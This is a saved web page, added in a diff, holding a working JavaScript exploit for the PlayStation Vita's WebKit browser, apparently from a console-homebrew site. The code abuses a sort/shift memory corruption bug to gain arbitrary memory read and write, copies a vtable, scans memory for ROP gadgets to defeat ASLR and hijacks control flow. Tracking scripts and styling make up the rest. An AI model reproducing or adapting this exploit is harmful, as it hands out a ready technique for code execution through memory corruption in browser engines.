@@ -1,0 +1,356 @@
+
+<!-- saved from url=(0035)http://wololo.net/v/webkit/vita.htm -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style id="stndz-style"></style></head><body cz-shortcut-listen="true">
+<script src="./vita_files/quant.js.Download" async="" type="text/javascript"></script><script async="" src="./vita_files/beacon.js.Download"></script><script src="./vita_files/utils.js.Download"></script>
+<script type="text/javascript">
+
+// global vars
+var _gc, _cnt = 0;
+
+function tryExpl_vita(att)
+{
+	try {      
+    //
+    // Part 1: getting the Uint32Array object address
+    //
+	    // init vars  	    
+	    var u32 = new Uint32Array(8);
+	    var a1 = [0,1,2,3,u32];	       
+	    var a2 = [0,1,2,3,4]; // right after a1
+	    var a1len = a1.length;
+	    var a2len = a2.length;	
+	    var u32len = u32.length;  
+	    	         	    
+	    // protect local vars from GC	         	    
+	    if (!_gc) _gc = new Array();
+	    _gc.push(u32,a1,a2);
+	    
+	    // declare custom compare function    
+	    var myCompFunc = function(x,y)
+	    {  	    	
+	    	// check for the last call for two last array items
+	    	if (y == 3 && x == u32) {
+	    		logAdd("myCompFunc(u32,3)");	    	
+	    		// shift() is calling during sort(), what causes the 
+	    		// last array item is written outside the array buffer
+	    		a1.shift();
+	    	}	    	    		
+	    	return 0;
+	    } 
+	    
+	    // call the vulnerable method - JSArray.sort(...)
+	    a1.sort(myCompFunc);
+	           
+	    // check results: a2.length should be overwritten by a1[4]   
+	    var u32addr = a2.length;
+	    logAdd("a2.length = 0x" + u32addr.toString(16));
+	    if (u32addr == a2len) { logAdd("error: 1"); return 1; }
+	    
+    //
+    // Part 2: creating corrupted JSValue which points to the (u32+0x28) address
+    //
+	  	
+	  	// modify our compare function
+		myCompFunc = function(x,y)
+		{
+	    	if (y == 0 && x == 1) {
+	    		logAdd("myCompFunc(1,0)");   	
+	    		// 
+	    		// call shift() again to read the corrupted JSValue from a2.length 
+	    		// into a1[3] on the next sort loop
+	    		a1.length = a1len;
+	    		a1.shift();
+	    		// modify JSValue 
+	    		a2.length = u32addr + 0x28;
+	    	}
+	    	if (y == 3) {
+	    		logAdd("myCompFunc(x,3)");
+	    		// shift it back to access a1[3]
+	    		a1.unshift(0);
+	    	}       		
+	    	return 0;
+	    } 
+	    
+	    // start sorting
+		a1.sort(myCompFunc);
+		
+		// now a1[3] should contain the corrupted JSValue from a2.length (=u32addr+0x28)
+		var c = a2.length;
+		logAdd("a2.length = 0x" + c.toString(16));
+		if (c != u32addr + 0x28) { logAdd("error: 2"); a1[3] = 0; return 2; }
+		
+	//
+	// Part 3: overwriting ((JSUint32Array)u32).m_impl pointer (see JSCTypedArrayStubs.h)
+	//
+								
+		// prepare objects for the third sort() call
+		var mo = {};
+	    var pd = { get: function(){return 0;}, set: function(arg){return 0;}, enumerable:true, configurable:true }		
+		var a3 = [0,1,2,a1[3]];
+		
+		// allocate mo's property storage right after a3's buffer
+	    Object.defineProperty(mo, "prop0", pd);
+	    for(var i=1; i < 7; i++){
+	    	mo["prop"+i] = i;
+	    }	
+	    
+	    // protect from GC
+	    _gc.push(a3,mo,pd); 	
+		
+		// use sort-n-shift technique again
+		myCompFunc = function(x,y)
+		{  	
+	    	// check for the last call for two last array items
+	    	if (y == 2) {
+	    		logAdd("myCompFunc(a3[3],2)"); 	
+	    		// a3[3] will be written over the mo.prop0 object
+	    		a3.shift();
+	    	}	     		
+	    	return 0;
+	    } 
+		
+		// overwrite mo.prop0 by a3[3] = a1[3] = &u32+0x28
+	    a3.sort(myCompFunc);
+	    // clear corrupted JSValue
+	    a1[3] = 0; a3[3] = 0; 
+	    
+	    // construct the valid GetterSetter object
+	    u32.prop1 = 8; 	// 8 = JSType.GetterSetterType
+	    u32.prop2 = 8; 
+	    u32.prop3 = 8;	    
+	    u32.prop4 = u2d(u32addr, u32addr+0x10); // ((GetterSetter)mo.prop0).m_structure
+	      
+	    // prepare JSFunction which will be refered by u32.m_impl  
+	    var f = new Function(" return 876543210 + " + (_cnt++) + ";");
+  		f.prop2 = u2d(0x40000000,0x40000000); // a new value for u32.length
+	    f();
+	    
+	    // overwrite u32.m_impl by the pd.get object
+	    pd.get = f;
+	    Object.defineProperty(mo, "prop0", pd);	
+		
+		// delete corrupted property
+		delete mo.prop0;
+		
+		// check results: u32.length is taken from f's internals
+		logAdd("u32.length = 0x" + u32.length.toString(16));
+		if (u32.length == u32len) { logAdd("error: 3"); return 3; }
+		//logAdd("u32[] data:<br/>" + ArrayToString(u32,0,16)); // for RnD
+		
+	//
+	//  Part 4: copying vtable
+	//
+			
+		// find out the memory address of u32[0] (ArrayBufferView.m_baseAddress)
+		var u32base = u32[0x40000000-2];
+		logAdd("u32 address = 0x" + u32addr.toString(16));
+		logAdd("u32 base = 0x" + u32base.toString(16));
+			
+		// declare aux functions 				
+		var getU32 = function(addr) { 
+			return u32[(addr - u32base) >>> 2]; 	
+		}
+		var setU32 = function(addr,val) { 
+			return u32[(addr - u32base) >>> 2] = val; 	
+		}
+
+        var getU8 = function(addr) {
+            return (getU32((addr)& ~0x3) >>> (((addr)%4) * 8)) & 0xFF;
+        }
+        
+		var vtable = getU32(u32addr);
+		
+		// copy vtable to writable memory (u32base)
+		for (var i = 0; i < 50; i++)
+		{
+			u32[i] = getU32(vtable+(i*4));
+		}
+		
+		u32[0] = u32base+0xA0;
+		
+        // load the function address in scewebkit
+        var webkit = u32[0x48/4];
+        var match = 0;
+        
+        while (++webkit % 0x8);
+        
+        for (var i = webkit; ; i+=8)
+        {
+           if ((String.fromCharCode(getU8(i)) == 'S') &&
+                (String.fromCharCode(getU8(i+1)) == 'c') &&
+                (String.fromCharCode(getU8(i+2)) == 'e') &&
+                (String.fromCharCode(getU8(i+3)) == 'W') &&
+                (String.fromCharCode(getU8(i+4)) == 'e') &&
+                (String.fromCharCode(getU8(i+5)) == 'b') &&
+                (String.fromCharCode(getU8(i+6)) == 'K') &&
+                (String.fromCharCode(getU8(i+7)) == 'i') &&
+                (String.fromCharCode(getU8(i+8)) == 't'))
+            {
+                webkit = i;
+                break;
+            }
+        }
+        
+        var gadget1 = 0;
+        var gadget2 = 0;
+        var gadget3 = 0;
+        
+        alert("Press OK, the process may take a few minutes. Found webkit at:" + webkit.toString(16));
+        
+        for (var i = webkit; ; i-=2)
+        {
+            // check for gadget 1
+            // 09 68 19 B1 0A 68 92 68 90 47
+            if (gadget1 == 0 && (getU8(i) == 0x09) &&
+                (getU8(i+1) == 0x68) &&
+                (getU8(i+2) == 0x19) &&
+                (getU8(i+3) == 0xb1) &&
+                (getU8(i+4) == 0x0a) &&
+                (getU8(i+5) == 0x68) &&
+                (getU8(i+6) == 0x92) &&
+                (getU8(i+7) == 0x68) &&
+                (getU8(i+8) == 0x90) &&
+                (getU8(i+9) == 0x47))
+            {
+                gadget1 = i+1;
+            }
+            
+            // GADGET 2: 08 68 00 22 D0 F8 A4 30 00 A8 98 47
+            if (gadget2 == 0 && (getU8(i) == 0x08) &&
+                (getU8(i+1) == 0x68) &&
+                (getU8(i+2) == 0x00) &&
+                (getU8(i+3) == 0x22) &&
+                (getU8(i+4) == 0xd0) &&
+                (getU8(i+5) == 0xf8) &&
+                (getU8(i+6) == 0xa4) &&
+                (getU8(i+7) == 0x30) &&
+                (getU8(i+8) == 0x00) &&
+                (getU8(i+9) == 0xa8) &&
+                (getU8(i+10) == 0x98) &&
+                (getU8(i+11) == 0x47))
+            {
+                gadget2 = i+1;
+            }
+            
+            // GADGET 3: 15 F5 01 70 14 F5 01 71 5F F4 80 62 15 F2 4A EC 70 BD 10 B5
+            if (gadget3 == 0 && (getU8(i) == 0x15) &&
+                (getU8(i+1) == 0xf5) &&
+                (getU8(i+2) == 0x01) &&
+                (getU8(i+3) == 0x70) &&
+                (getU8(i+4) == 0x14) &&
+                (getU8(i+5) == 0xf5) &&
+                (getU8(i+6) == 0x01) &&
+                (getU8(i+7) == 0x71) &&
+                (getU8(i+8) == 0x5f) &&
+                (getU8(i+9) == 0xf4) &&
+                (getU8(i+10) == 0x80) &&
+                (getU8(i+11) == 0x62) &&
+                //(getU8(i+12) == 0x15) &&
+                //(getU8(i+13) == 0xf2) &&
+                //(getU8(i+14) == 0x4a) &&
+                //(getU8(i+15) == 0xec) &&
+                (getU8(i+16) == 0x70) &&
+                (getU8(i+17) == 0xbd) &&
+                (getU8(i+18) == 0x10) &&
+                (getU8(i+19) == 0xb5))
+            {
+                gadget3 = (i+8)+1;
+            }
+            
+            if (gadget1 != 0 && gadget2 != 0 && gadget3 != 0)
+            {
+                alert("Congrats, this vita is vulnerable\n");
+                break;
+            }
+        }
+        
+		// ASLR ADAPTED GADGETS
+		u32[0x48/4] = gadget1;
+		u32[0xA8/4] = gadget2;
+		u32[(0xA0+0xA4)/4] = gadget3;
+		
+		// BEGIN STACK
+		u32[3] = 0xB16B00B5; // this is new PC
+		
+		// write new vtable
+		u32[0x40000000-2] = u32addr >>> 0;
+		u32[0] = u32base;
+		
+		// BEGIN ROP AND ROLL
+		u32.toString(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
+	}
+	catch(e) {
+	    logAdd("Error: " + e);
+	}
+	
+	return 0;
+}
+
+// "Start" button onclick handler
+function btnClick()
+{
+	try {   
+	    logAdd("======== Start ========");
+		
+		tryExpl_vita(1);
+		
+		logAdd("<br/>========&nbsp;End &nbsp;========<br/><br/>");	
+	}
+	catch(e) {
+	    logAdd(e);
+	}
+	_log = null;
+}
+
+// print environment info
+writeEnvInfo();
+
+</script>15:40:37 GMT+0100 (Mitteleuropäische Zeit)<br>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36<br>Netscape (Win32)<br><br>
+
+<button style="width:100px;" onclick="btnClick();">Start</button>
+<br><br>
+<div id="log"></div>
+<!--Begin comScore Tag--><script>var _comscore=_comscore||[];_comscore.push({c1:"2",c2:"20015427"});(function(){var s=document.createElement("script"),el=document.getElementsByTagName("script")[0];s.async=true;s.src=(document.location.protocol=="https:"?"https://sb":"http://b")+".scorecardresearch.com/beacon.js";el.parentNode.insertBefore(s,el)})();</script><noscript>&lt;img src="https://sb.scorecardresearch.com/p?c1=2&amp;c2=20015427&amp;cv=2.0&amp;cj=1"/&gt;</noscript><!--End comScore Tag-->
+<!--Quantcast Tag--><script type="text/javascript">var _qevents=_qevents||[];(function(){var elem=document.createElement('script');elem.src=(document.location.protocol=="https:"?"https://secure":"http://edge")+".quantserve.com/quant.js";elem.async=true;elem.type="text/javascript";var scpt=document.getElementsByTagName('script')[0];scpt.parentNode.insertBefore(elem,scpt)})();_qevents.push({qacct:"p-31iz6hfFutd16",labels:"Domain.wololo_net,DomainId.5993"});</script><noscript>&lt;div style="display:none;"&gt;&lt;img src="//pixel.quantserve.com/pixel/p-31iz6hfFutd16.gif?labels=Domain.wololo_net,DomainId.5993"border="0"height="1"width="1"alt="Quantcast"/&gt;&lt;/div&gt;</noscript><!--End Quantcast tag-->
+<script type="text/javascript" style="display:none;" async="">
+__ez.queue.addFile('edmonton.php', '//wololo.net/detroitchicago/edmonton.webp?a=a&cb=3&shcb=29', true, [], true, false, false, false);
+__ez.queue.addFile('jellyfish.php', '//wololo.net/porpoiseant/jellyfish.webp?a=a&cb=3&shcb=29', false, [], true, false, false, false);
+</script>
+
+<style type="text/css">
+    /* loading */
+    .lt-sk-three-bounce {
+      margin: 2px auto;
+      width: 100%;
+      text-align: center; }
+      .lt-sk-three-bounce .lt-sk-child {
+        width: 5px;
+        height: 5px;
+        background-color: #333;
+        border-radius: 100%;
+        display: inline-block;
+        -webkit-animation: lt-sk-three-bounce 1.4s ease-in-out 0s infinite both;
+                animation: lt-sk-three-bounce 1.4s ease-in-out 0s infinite both; }
+      .lt-sk-three-bounce .lt-sk-bounce1 {
+        -webkit-animation-delay: -0.32s;
+                animation-delay: -0.32s; }
+      .lt-sk-three-bounce .lt-sk-bounce2 {
+        -webkit-animation-delay: -0.16s;
+                animation-delay: -0.16s; }
+
+    @-webkit-keyframes lt-sk-three-bounce {
+      0%, 80%, 100% {
+        -webkit-transform: scale(0);
+                transform: scale(0); }
+      40% {
+        -webkit-transform: scale(1);
+                transform: scale(1); } }
+
+    @keyframes lt-sk-three-bounce {
+      0%, 80%, 100% {
+        -webkit-transform: scale(0);
+                transform: scale(0); }
+      40% {
+        -webkit-transform: scale(1);
+                transform: scale(1); } }
+  </style></body></html>
